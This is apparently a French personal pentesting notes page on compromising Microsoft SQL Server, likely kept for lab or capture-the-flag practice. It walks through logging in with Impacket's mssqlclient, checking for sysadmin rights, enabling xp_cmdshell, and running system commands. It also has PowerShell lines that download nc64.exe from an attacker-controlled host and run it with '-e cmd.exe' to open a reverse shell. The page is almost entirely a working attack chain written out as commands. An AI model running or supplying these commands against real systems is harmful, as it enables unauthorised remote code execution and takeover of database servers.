<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](server_procedure.md)</sub>
#SQL Server

**Help :**
- help : aide
- -c : execute la commande

**Procédure :**
- Authentification ????? : script [Impacket](impacket.md) : *python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py **USER**@**IP** -windows-auth*
- Pour voir toutes les tables et leur taille : *select name from sys.databases;* OU *exec sp_databases;*
- Pour savoir si on est sysadmin : *select is_srvrolemember('sysadmin')* => si répond 1 => true
- Si le shell windows n'est pas activé :
  - Exécuter un shell windows :
  - si on est sysadmin : procédure stockée pour voir toute la config : *EXEC sp_configure 'show advanced options', 1;*
  - suivre avec : RECONFIGURE
  - pour activer le xp_cmdshell : *EXEC sp_configure 'xp_cmdshell', 1;* =>  puis RECONFIGURE
- Si le shell windows est activé pour l'utiliser: procédure stockée : *EXEC xp_cmdshell 'net user';*
  - Explorer : *xp_cmdshell "powershell -c pwd* 
  - Trouver un dossier (?????? JE SAIS PAS COMMENT) où l utilisateur peut poser un fichier
  - [Simuler un serveur http](sim_http_server.md)
  - Récupérer le [n64.exe](nc64.md). ex : *xp_cmdshell "powershell -c cd C:\FOLDERs; wget http://*LHOST*/nc64.exe -outfile nc64.exe"*
  - Ouvrir port [ncat](ncat.md)
  - Exécuter le [n64.exe](nc64.md). ex : *xp_cmdshell "powershell -c cd C:\FOLDER; .\nc64.exe -e cmd.exe *LHOST* *LPORT*"*
 

